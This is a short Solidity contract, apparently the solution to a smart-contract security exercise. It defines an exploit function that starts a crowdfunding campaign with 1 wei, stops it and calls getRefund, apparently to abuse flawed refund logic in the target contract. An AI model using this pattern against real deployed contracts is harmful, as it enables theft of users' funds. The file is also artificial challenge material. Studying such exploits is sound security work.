pragma solidity 0.8.4;

import "../interfaces/ICrowdfunding.sol";

interface IExploit {
    function exploit() external payable;
}

contract CrowdfundingExploit is IExploit {
    ICrowdfunding public crowdfunding;

    constructor(address _crowdfundingAddr) {
        crowdfunding = ICrowdfunding(_crowdfundingAddr);
    }

    function exploit() external payable override {
        crowdfunding.startCampaign{value: 1 wei}();
        crowdfunding.stopCampaign{value: 0}(0);
        crowdfunding.getRefund{value: 1 wei}(0, 0);
    }

    receive() external payable {}
}
